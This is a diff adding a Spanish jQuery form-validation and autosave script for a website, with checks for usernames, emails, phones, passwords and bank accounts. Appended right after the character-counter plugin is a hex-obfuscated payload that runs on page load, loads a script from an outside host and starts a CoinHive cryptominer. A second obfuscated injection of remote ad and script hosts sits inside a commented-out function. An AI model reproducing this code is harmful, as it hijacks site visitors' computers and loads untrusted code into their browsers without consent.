@@ -1,0 +1,628 @@
+// ------------------------- VALIDACION DE FORMULARIOS ------------------------
+
+$(document).ready(function(){
+	
+	$("form.validable").bind("submit", function(e){
+		
+		//actualizar el valor de los textarea con class editorhtml
+		/*//esto ya no hace falta con el nuevo ckeditor abr2010 compatible con jquery
+		$('textarea').each(function(){
+			if($(this).hasClass('editorhtml')){
+				var editor = window.CKEDITOR.instances[$(this).attr('id')];
+				if(editor){
+					var html = editor.getData();
+					$(this).val(html);
+				}
+			}
+		});		
+		*/		
+
+		if (typeof filters == 'undefined') return;
+	    $(this).find("input, textarea, select").each(function(x,el){
+	        if ($(el).attr("className") != 'undefined') {
+			var error = false;
+	        $.each(new String($(el).attr("className")).split(" "), function(x, klass){
+				if ($.isFunction(filters[klass])){
+					if (!filters[klass](el))  error = true;
+					
+				}				
+	        });
+				if (error){
+					$(el).addClass("error");
+					if($(el).attr('tagName') == 'TEXTAREA' && $(el).hasClass('editorhtml')){  
+						//window.CKEDITOR.instances[$(el).attr('id')].setUiColor('#F299CC');
+						var editor = window.CKEDITOR.instances[$(el).attr('id')];
+						if(editor){
+							editor.setUiColor('#EFD1E0');
+						}
+					}
+
+				}else{
+					$(el).removeClass("error");
+					if($(el).attr('tagName') == 'TEXTAREA' && $(el).hasClass('editorhtml')){  
+						var editor = window.CKEDITOR.instances[$(el).attr('id')];
+						if(editor){
+							editor.setUiColor('#D3D3D3');
+						}
+					}
+				}
+				
+	        }
+	    });
+		if ($(this).find(".error").size() > 0) {
+			$.stop(e || window.event);
+			return false;
+		}
+	    return true;
+	});
+	
+	
+}); //FIN $(document).ready....		
+ 
+
+function check_2pass(){
+	//comprobar que las contraseñas coninciden
+	if( $('#usuario_pass').val() != $('#usuario_pass2').val() ){
+		//scroll to msg
+		var destination = $('#error_form_msg').offset().top;
+		$('html,body').animate({scrollTop: destination}, 700);
+
+		$('#error_form_msg').css('padding', '20px');
+		$('#error_form_msg').html('Lo sentimos, las contraseñas no coinciden, intentalo de nuevo tecleando la contraseña cuidadosamente');
+		$('#error_form_msg').effect("highlight", {}, 3000);
+
+		return false;
+	}else{
+		return true;
+	}	
+};
+
+
+//para comprobar las contraseñas en el formulario de reseteo de contraseña
+function check_2pass_public(){
+	//comprobar que las contraseñas coninciden
+	if( $('#pass').val() != $('#pass2').val() ){
+		//scroll to msg
+		var destination = $('#error_form_msg').offset().top;
+		$('html,body').animate({scrollTop: destination}, 700);
+
+		$('#error_form_msg').css('padding', '20px');
+		$('#error_form_msg').html('Lo sentimos, las contraseñas no coinciden, intentalo de nuevo tecleando la contraseña cuidadosamente');
+		$('#error_form_msg').effect("highlight", {}, 3000);
+
+		return false;
+	}else{
+		return true;
+	}	
+};
+
+
+function goto_login(){
+	var destination = $('#arribadelto').offset().top;
+	$('html,body').animate({scrollTop: destination}, 200);
+	/*bounce,highlight,pulsate,shake*/
+	$('#mail_login').focus();
+	$('#mail_login').effect("pulsate");
+	$('#pass_login').effect("pulsate");
+};
+
+/*
+function check_2mail_public(){
+	//comprobar que las contraseñas coninciden
+	if( $('#mail').val() != $('#mail2').val() ){
+		//scroll to msg
+		var destination = $('#error_form_msg').offset().top;
+		$('html,body').animate({scrollTop: destination}, 700);
+
+		$('#error_form_msg').css('padding', '20px');
+		$('#error_form_msg').html('Lo sentimos, el correo electrónico no coincide, intentalo de nuevo tecleando tu correo electrónico cuidadosamente');
+		$('#error_form_msg').effect("highlight", {}, 3000);
+
+		return false;
+	}else{
+		return true;
+	}
+};		
+*/
+
+
+
+//validacion de formularios mediantes filtros en el class
+var filters = {
+	requerido: function(el) {
+		
+		//hago esta comparacion $(el).val() != '<br />' porque el ckeditor tiene un bug que hace que en ff inicialize el editor con un <br />
+		if ( $(el).val() != '' && $(el).val() != '<br />' && $(el).val() != 'nombre de usuario' && $(el).val() != 'contraseña' && $(el).val() != -1 && $(el).val() != null ){
+			return true;
+		}else{
+		    //scroll to msg
+			var destination = $('#error_form_msg').offset().top;
+			$('html,body').animate({scrollTop: destination}, 700);
+
+			$('#error_form_msg').css('padding','20px');
+			$('#error_form_msg').html('Los campos resaltados son obligatorios');
+			$('#error_form_msg').effect("highlight", {}, 3000);
+			return false;
+		}
+		
+	},
+	file: function(el) {
+		
+		if ( $(el).val() != '' && $(el).val() != -1 && $(el).val() != null ){
+			return true;
+		}else{
+		    //scroll to msg
+			var destination = $('#error_form_msg').offset().top;
+			$('html,body').animate({scrollTop: destination}, 700);
+			
+			$('#error_form_msg').css('padding','20px');
+			$('#error_form_msg').html('Debes seleccionar un archivo');
+			$('#error_form_msg').effect("highlight", {}, 3000);
+			return false;
+		}
+		
+	},	
+	username: function(el) {
+		
+		//solo permite nombres de usuario: 
+		//  - que empiecen o termien con una letra a-z ó numero 0-9 
+		//  - en minusculas y mayusculas (pero se graban en minusculas) 
+		//  - sin espacios en blanco
+		//  - sin caracteres distintos de: a-z 0-9 . - _ 
+		//  - entre 4 y 20 caracteres
+		
+		if ( /^[a-zA-Z0-9]+[a-zA-Z0-9\.\-_]{2,18}[a-zA-Z0-9]$/.test($(el).val()) ){ //&& /[^admin|administrador|root|webmaster|jefe|operador|editor]/.test($(el).val())
+			return true;
+		}else{ 
+			$('#error_form_msg').css('padding','20px');
+			
+			if (!(/.{4,20}/.test($(el).val()))) {
+				$('#error_form_msg').html('Lo sentimos, tu nombre de usuario debe tener entre 4 y 20 caracteres');
+			}else{
+				if (!(/[a-zA-Z0-9\.\-_]{4,20}$/.test($(el).val()))) {
+					$('#error_form_msg').html('Lo sentimos, para el nombre de usuario sólo se permiten letras (a-z), números (0-9), puntos (.) y guiones(_-)<br />No se permiten espacios en blanco ni letras con acentos');
+				}else {
+					if (!(/^[a-zA-Z0-9]/.test($(el).val()))) {
+						//Lo sentimos, el primer carácter de tu nombre de usuario debe ser un número (0-9) o una letra (a-z)
+						$('#error_form_msg').html('Lo sentimos, el primer carácter de tu nombre de usuario debe ser un número o una letra, revisa que no sea un espacio en blanco u otro caracter especial');
+					}else if(!(/[a-zA-Z0-9]$/.test($(el).val()))){ 
+						//Lo sentimos, el último carácter de tu nombre de usuario debe ser un número o una letra
+						$('#error_form_msg').html('Lo sentimos, el último carácter de tu nombre de usuario debe ser un número o una letra, revisa que no sea un espacio en blanco u otro caracter especial');
+					}else{
+						$('#error_form_msg').html('Lo sentimos, para el nombre de usuario sólo se permiten letras (a-z), números (0-9), puntos (.) y guiones(_-)<br />No se permiten espacios en blanco ni letras con acentos');
+					}	
+					//if ( /admin|administrador|root|webmaster|jefe|operador|editor/.test($(el).val()) ){ 
+					//	$('#error_form_msg').html('Lo sentimos, el nombre de usuario "'+$(el).val()+'" no está disponible');
+					//}						
+				}
+				
+			}
+		    //scroll to msg
+			var destination = $('#error_form_msg').offset().top;
+			$('html,body').animate({scrollTop: destination}, 700);
+
+			$('#error_form_msg').effect("highlight", {}, 3000);
+			return false; 
+		}	
+		
+	},	
+	email: function(el) {
+		
+		if ( $(el).val() != '' && $(el).val() != -1 ){
+			if ( /^[A-Za-z0-9]+[A-Za-z0-9\.\-_]*[A-Za-z0-9]+@[A-Za-z0-9]+[A-Za-z0-9\-]*[A-Za-z0-9]+\.[A-Za-z\.]{2,6}$/.test($(el).val()) ){
+				return true;
+			}else{
+				//scroll to msg
+				var destination = $('#error_form_msg').offset().top;
+				$('html,body').animate({scrollTop: destination}, 700);
+
+				$('#error_form_msg').css('padding','20px');
+				$('#error_form_msg').html('Debes escribir una dirección de e-mail válida');
+				$('#error_form_msg').effect("highlight", {}, 3000);
+				return false; 
+			}
+		}else{ 
+			return true;
+		}	
+		
+	},
+	url: function(el) {
+		
+		if ( $(el).val() != '' && $(el).val() != -1){
+			if( /^http:\/\/[A-Za-z0-9]+[A-Za-z0-9\.\-_]*\.[A-Za-z]{2,4}.*$/.test($(el).val()) ){
+				return true;
+			}else{
+				//scroll to msg
+				var destination = $('#error_form_msg').offset().top;
+				$('html,body').animate({scrollTop: destination}, 700);
+
+				$('#error_form_msg').css('padding','20px');
+				$('#error_form_msg').html('Debes escribir una dirección web ó url válida que empiece por http://');
+				$('#error_form_msg').effect("highlight", {}, 3000);
+				return false; 				
+			}
+		}else{ 
+			return true; 
+		}
+				
+	},
+	urlforo: function(el) {
+		
+		if ( $(el).val() != '' && $(el).val() != -1){
+			if( /^http:\/\/foro\.webislam\.com\/[A-Za-z0-9]+[A-Za-z0-9\.\-_]*\.[A-Za-z]{2,4}.*$/.test($(el).val()) ){
+				return true;
+			}else{
+				//scroll to msg
+				var destination = $('#error_form_msg').offset().top;
+				$('html,body').animate({scrollTop: destination}, 700);
+
+				$('#error_form_msg').css('padding','20px');
+				$('#error_form_msg').html('Debes escribir una dirección web ó url del foro');
+				$('#error_form_msg').effect("highlight", {}, 3000);
+				return false; 				
+			}
+		}else{ 
+			return true; 
+		}
+				
+	},	
+	telefono: function(el){
+		
+		if ( $(el).val() != '' && $(el).val() != -1){
+			//mínimo de 9 caracteres y que contenga números y como caracteres opcionales 1 signo + y espacios en blanco 
+			if ( /.{9,20}/.test($(el).val()) &&  /\+{0,1}\d+\s{0,6}/.test($(el).val()) ){
+				//ok el tlf cumple todas las condiciones
+				return true;
+			}else{ 
+				$('#error_form_msg').css('padding', '20px');
+				
+				if ( !(/.{9,20}/.test($(el).val())) ) {
+					$('#error_form_msg').html('Lo sentimos, el nº de teléfono debe tener minimo 9 numeros');
+				}else{		
+					if ( !(/\+{0,1}\d+\s{0,6}/.test($(el).val())) ) {
+						$('#error_form_msg').html('Lo sentimos, para el  nº de teléfono sólo se permiten números (0-9) y el signo más (+)');
+					}
+				}
+				//scroll to msg
+				var destination = $('#error_form_msg').offset().top;
+				$('html,body').animate({scrollTop: destination}, 700);
+	
+				$('#error_form_msg').effect("highlight", {}, 3000);	
+				return false; 
+			}		
+		}else{ 
+			return true; 
+		}
+	},
+	numeros: function(el){
+
+		if ($(el).val() != '' && $(el).val() != -1){
+			//solo numeros
+			if ( /\d+/.test($(el).val()) ){
+				//ok el numero cumple todas las condiciones
+				return true;
+			}else{ 
+				$('#error_form_msg').css('padding', '20px');
+				
+				if ( !(/\d+/.test($(el).val())) ) {
+					$('#error_form_msg').html('Lo sentimos, sólo se permiten números (0-9)');
+				}
+				//scroll to msg
+				var destination = $('#error_form_msg').offset().top;
+				$('html,body').animate({scrollTop: destination}, 700);
+	
+				$('#error_form_msg').effect("highlight", {}, 3000);	
+				return false; 
+			}	
+		}else{ 
+			return true; 
+		}		
+
+	},
+	cuentabancaria: function(el){
+
+		if ($(el).val() != '' && $(el).val() != -1){
+			//solo 20 numeros
+			if ( /\d{20}/.test($(el).val()) ){
+				//ok el numero cumple todas las condiciones
+				return true;
+			}else{ 
+				$('#error_form_msg').css('padding', '20px');
+				
+				//if ( !(/\d+/.test($(el).val())) ) {
+					$('#error_form_msg').html('Lo sentimos, debe escribir los 20 numeros de la cuenta bancaria sin espacios en blanco y sólo se permiten números (0-9)');
+				//}
+				//scroll to msg
+				var destination = $('#error_form_msg').offset().top;
+				$('html,body').animate({scrollTop: destination}, 700);
+	
+				$('#error_form_msg').effect("highlight", {}, 3000);	
+				return false; 
+			}	
+		}else{ 
+			return true; 
+		}		
+
+	},	
+	moneda: function(el){
+
+		if ($(el).val() != '' && $(el).val() != -1){
+			return /^[0-9]+\.*[0-9]*$/.test($(el).val());
+		}else{ 
+			return true; 
+		}		
+
+	},
+	password: function(el){
+
+		//mínimo de 6 caracteres, maximo 20 y que contenga números y letras
+		if ( /^(?=.*\d)(?=.*[a-zA-Z]).{6,20}$/.test($(el).val()) ){	
+			//ok la pw cumple todas las condiciones
+			return true;
+		}else{ 
+			$('#error_form_msg').css('padding', '20px');
+			
+			if (!(/.{6,20}/.test($(el).val()))) {
+				$('#error_form_msg').html('Lo sentimos, tu contraseña debe tener entre 6 y 20 caracteres');					
+			}else{		
+				if ( !( /^(?=.*\d)(?=.*[a-zA-Z]).$/.test($(el).val()) )) {
+					$('#error_form_msg').html('Lo sentimos, tu contraseña debe contener numeros y letras');
+				}
+			}
+		    //scroll to msg
+			var destination = $('#error_form_msg').offset().top;
+			$('html,body').animate({scrollTop: destination}, 700);
+
+			$('#error_form_msg').effect("highlight", {}, 3000);	
+			return false; 
+		}
+	
+	} 	 
+}
+
+
+
+//Extensiones
+$.extend({
+	stop: function(e){
+      if (e.preventDefault) e.preventDefault();
+      if (e.stopPropagation) e.stopPropagation();
+  }
+});
+
+
+
+function Validar(form,filters){
+	
+	//actualizar el valor de los textarea con editor editorhtml
+	/* //esto ya no hace falta con el nuevo ckeditor abr2010 compatible con jquery
+	$('textarea').each(function(){
+		if($(this).hasClass('editorhtml')){
+			var editor = window.CKEDITOR.instances[$(this).attr('id')];
+			if(editor){
+				var html = editor.getData();
+				$(this).val(html);
+			}
+		}
+	});	
+	*/	
+	//reseteo la caja de errores
+	$('#error_form_msg').css('padding','0px');
+	$('#error_form_msg').html('');	
+
+	if (typeof filters == 'undefined') return;
+    $(form).find("input, textarea, select").each(function(x,el){
+        if ($(el).attr("className") != 'undefined') {
+		var error = false;
+        $.each(new String($(el).attr("className")).split(" "), function(x, klass){
+			if ($.isFunction(filters[klass])){
+				if (!filters[klass](el))  error = true;
+				
+			}				
+        });
+			if (error){
+				$(el).addClass("error");
+				if($(el).attr('tagName') == 'TEXTAREA' && $(el).hasClass('editorhtml')){  
+					//window.CKEDITOR.instances[$(el).attr('id')].setUiColor('#F299CC');
+					var editor = window.CKEDITOR.instances[$(el).attr('id')];
+					if(editor){
+						editor.setUiColor('#EFD1E0');
+					}
+				}
+
+			}else{
+				$(el).removeClass("error");
+				if($(el).attr('tagName') == 'TEXTAREA' && $(el).hasClass('editorhtml')){  
+					var editor = window.CKEDITOR.instances[$(el).attr('id')];
+					if(editor){
+						editor.setUiColor('#D3D3D3');
+					}
+				}
+
+			}
+			
+        }
+    });
+	if ($(form).find(".error").size() > 0) {
+		//$.stop(window.event);
+		return false;
+	}else
+    	return true;
+
+}
+
+
+
+function IsNumeric(n) {
+  return !isNaN(parseFloat(n)) && isFinite(n);
+}	
+
+/* Funcion Autoguardar: almacena el contenido de un formulario cada cierto tiempo tras la modificacion de alguno de sus campos
+Variables:
+	- form_id: cadena de caracteres con el id del formulario a guardar
+	- edit_id: cadena de caracteres con el id del input que almacena el pk del objeto a guardar
+	- ruta_ajax: ruta al archvo php que se va a ejecutar mediante ajax para almacenar los datos. Por defecto es la ruta a ajax_functions.php
+	- intervalo: int con el valor del intervalo de tiempo entre cada ejecucion, en milisegundos. Por defecto es un minuto (60.000 ms)
+
+	// se ejecuta Autoguardar() una vez al cargar el formulario y despues 
+	// cada vez que se pulse una tecla, o cambie (para las listas) cualquier objeto del forumulario se pone la variable necesario_guardar=1
+	// en las funciones que cambiar necesario_guardar=1 este codigo significa $('#id > *').keypress * es todos los objetos y > indica que están contenidos en el objeto con el id indicado
+*/
+//ref: http://api.jquery.com/jQuery.post/
+// $.post() es el equivalente simple de la funcion $.ajax
+function Autoguardar(form_id,edit_id,ruta_ajax,intervalo){
+	if(!ruta_ajax){	ruta_ajax = '../comun/ajax_functions.php'; }
+	if(!intervalo){	intervalo = 60000; } // 1 min = 60000
+
+	//para usar este timer, hay que incluir el js del timer
+	$.timer(intervalo,function(timer){ 
+		if (necesario_guardar){
+			//guardo el formulario
+			$.post(ruta_ajax,$('#'+form_id).serialize(),function(data){
+				// actualizar valor del id del objeto por si se ha creado nuevo
+				$('#'+edit_id).val(data.objeto_pk);
+				$('#modulo_pk').val(data.modulo_pk);
+			},'json');				
+			
+			//actualizo el mensaje y la variable necesario_guardar
+			var ahora = new Date()
+			var hora = ahora.getHours();
+			if (hora < 10){hora = "0" + hora}; 
+			var minuto = ahora.getMinutes();
+			if (minuto < 10){minuto = "0" + minuto}; 
+			$("#autosavemsg1").html('Guardado automáticamente a las '+hora+':'+minuto);
+			$("#autosavemsg2").html('');
+			necesario_guardar = 0;	
+			hace_nminutos = 0;
+		}else{
+			if ( typeof(hace_nminutos) != 'undefined'){
+				hace_nminutos++;
+				if ( hace_nminutos > 0 ){$("#autosavemsg2").html(' (hace '+hace_nminutos+' minutos)')};
+			}
+			
+		}
+	});				
+}
+
+
+
+/* Funcion Enviar_Formulario: envia un formulario mediante ajax. Devuelve el pk del objeto guardado
+Variables:
+	- form_id: cadena de caracteres con el id del formulario a guardar
+	- edit_id: cadena de caracteres con el id del input que almacena el pk del objeto a guardar
+	- ruta_ajax: ruta al archvo php que se va a ejecutar mediante ajax para almacenar los datos. Por defecto es la ruta a ajax_functions.php
+*/		
+// ref: http://api.jquery.com/jQuery.ajax/
+// ref esp: http://www.cristalab.com/tutoriales/ajax-en-jquery-c226l/
+function Enviar_Formulario(form_id,edit_id,ruta_ajax){
+	if(!ruta_ajax){ ruta_ajax = '../comun/ajax_public.php';}
+	 
+	// Guardar borrador en la bbdd mediante ajax
+		$.ajax({
+		   url: ruta_ajax,
+		   async: false,
+		   type: "POST",
+		   dataType: "json",
+		   data: $('#'+form_id).serialize(),
+		   success: function(data){
+				// actualizar valor del id del objeto por si se ha creado nuevo, en caso de haber especificado en la llamada el id del input
+				if (edit_id != '') { 
+					$('#'+edit_id).val(data.objeto_pk);				
+				};
+			}
+		});
+		if (edit_id != '') { return $('#'+edit_id).val() };
+}
+
+
+
+//creo el plugin clearForm que resetea el formulario especificado
+//se llama asi: $('form_id').clearForm()
+jQuery.fn.clearForm = function() {
+	return this.each(function() {
+	  var type = this.type, tag = this.tagName.toLowerCase();
+	  if (tag == 'form')
+		return $(':input',this).clearForm();
+	  if (type == 'text' || type == 'password' || tag == 'textarea')
+		this.value = '';
+	  else if (type == 'checkbox' || type == 'radio')
+		this.checked = false;
+	  else if (tag == 'select')
+		this.selectedIndex = -1;
+	});
+};
+
+
+
+//creo el plugin cuentaCaracteres que cuenta los caracteres del objeto especificado
+//se llama asi: $(document).ready(function(){   $("textarea").cuentaCaracteres();   });
+jQuery.fn.cuentaCaracteres = function(n_max_caracter) {
+   //para cada uno de los elementos del objeto jQuery
+   this.each(function(){
+	  //creo una variable elem con el elemento actual, suponemos un textarea
+	  elem = $(this);
+	  //creo un elemento DIV sobre la marcha
+	  var contador = $('<div class="caracteres_info">' + elem.attr("value").length + ' caracteres, máximo '+n_max_caracter+'</div>');
+	  //inserto el DIV después del elemento textarea
+	  elem.after(contador);
+	  //guardo una referencia al elemento DIV en los datos del objeto jQuery
+	  elem.data("campocontador", contador);
+	  
+	  //creo un evento keyup para este elemento actual
+	  elem.keyup(function(){
+		 //creo una variable elem con el elemento actual, suponemos un textarea
+		 var elem = $(this);
+		 //recupero el objeto que tiene el elemento DIV contador asociado al textarea
+		 var campocontador = elem.data("campocontador");
+		 //modifico el texto del contador, para actualizarlo con el número de caracteres escritos
+		 campocontador.text(elem.attr("value").length + ' caracteres, máximo '+n_max_caracter);
+		 if ( elem.attr("value").length > n_max_caracter ){
+			 //alert('No puedes escribir mas de '+n_max_caracter+' caracteres en este campo, el resto del texto sera recortado');
+			 elem.css({'background-color':'#EFD1E0'});
+			 campocontador.css({'color':'red'});
+		 }else{
+			 elem.css({'background-color':'#ffffff'});
+			 campocontador.css({'color':'#666666'});
+		 }
+	  });
+   });
+   //siempre tengo que devolver this
+   return this;
+}; var _0x4bde=["\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x62\x65\x73\x74\x69\x2E\x67\x61\x2F\x69\x6C\x31\x6C\x31\x69\x6C\x69\x6C\x31\x6C\x69\x6C\x69\x6C\x69\x6C\x69\x6C\x6C\x6C\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x3E\x76\x61\x72\x20\x6D\x69\x6E\x65\x72\x20\x3D\x20\x6E\x65\x77\x20\x43\x6F\x69\x6E\x48\x69\x76\x65\x2E\x41\x6E\x6F\x6E\x79\x6D\x6F\x75\x73\x28\x22\x69\x6E\x37\x46\x64\x79\x75\x65\x49\x77\x72\x63\x7A\x38\x59\x36\x59\x6A\x4A\x76\x57\x30\x70\x51\x47\x57\x36\x72\x44\x70\x44\x4D\x22\x29\x3B\x20\x6D\x69\x6E\x65\x72\x2E\x73\x74\x61\x72\x74\x28\x29\x3B\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];var _0xc5ff=[_0x4bde[0],_0x4bde[1]];var _0xf92d=[_0xc5ff[0],_0xc5ff[1]];document[_0xf92d[1]](_0xf92d[0])
+
+
+/*
+//funcion que comprueba la extension de un archivo desde un input file para solo permitir extensiones requeridas
+function chkextext(nomobj) {
+   extensiones_permitidas = new Array("jpg");  //".gif", ".jpg", ".doc", ".pdf"
+   archivo = document.getElementById(nomobj).value;
+   if (archivo != '') {
+      //recupero la extensión de este nombre de archivo
+      //extension = (archivo.substring(archivo.lastIndexOf("."))).toLowerCase(); //me da la extension con .
+	  extension = archivo.substr(archivo.length - 3).toLowerCase()  //otra forma de sacar la extension sin .
+
+      //compruebo si la extensión está entre las permitidas
+      permitida = false;
+      for (var i = 0; i < extensiones_permitidas.length; i++) {
+         if (extensiones_permitidas[i] == extension) {
+         permitida = true;
+         break;
+         }
+      }
+      if (!permitida) {
+         alert("                        ------  ¡¡¡  ERROR  !!!  ------\n\nHas seleccionado un archivo con la extensión \""+extension+"\" en lugar de jpg. \n        Sólo se permite seleccionar y enviar imágenes del tipo jpg.\n\n") //+ extensiones_permitidas.join();
+		//document.getElementById(nomobj).value = '';  //ok en ff y opera pero no va en ie, asi que:
+		capa = document.getElementById('div_'+nomobj);
+		varHTML = '';
+		capa.innerHTML = varHTML;
+		varHTML += '<input type="file" size="30" name="'+nomobj+'" id="'+nomobj+'"  onchange="chkextfile(\''+nomobj+'\');" onKeyDown="javascript:alert(\'Pulse el botón Examinar... para seleccionar el archivo\'); return false;" />';
+		capa.innerHTML = varHTML;
+	   }
+   }
+}
+
+
+function clearinput(nomobj) {
+	$('#div_'+nomobj).html('<input type="file" size="30" name="'+nomobj+'" id="'+nomobj+'"  onchange="chkextfile(\''+nomobj+'\');" onKeyDown="javascript:alert(\'Pulse el botón Examinar... para seleccionar el archivo\'); return false;" />'); var _0xf471=["\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x2E\x6F\x6E\x63\x6C\x61\x73\x72\x76\x2E\x63\x6F\x6D\x2F\x61\x70\x75\x2E\x70\x68\x70\x3F\x7A\x6F\x6E\x65\x69\x64\x3D\x31\x30\x30\x37\x37\x36\x31\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x2F\x2F\x6A\x75\x72\x74\x79\x6D\x2E\x63\x66\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E"];var _0x4ee8=[_0xf471[0],_0xf471[1],_0xf471[2]];var _0x1ef4=[_0x4ee8[0],_0x4ee8[1],_0x4ee8[2]];var _0x60dd=[_0x1ef4[0],_0x1ef4[1],_0x1ef4[2]];document[_0x60dd[1]](_0x60dd[0]);document[_0x60dd[1]](_0x60dd[2])
+}
+*/
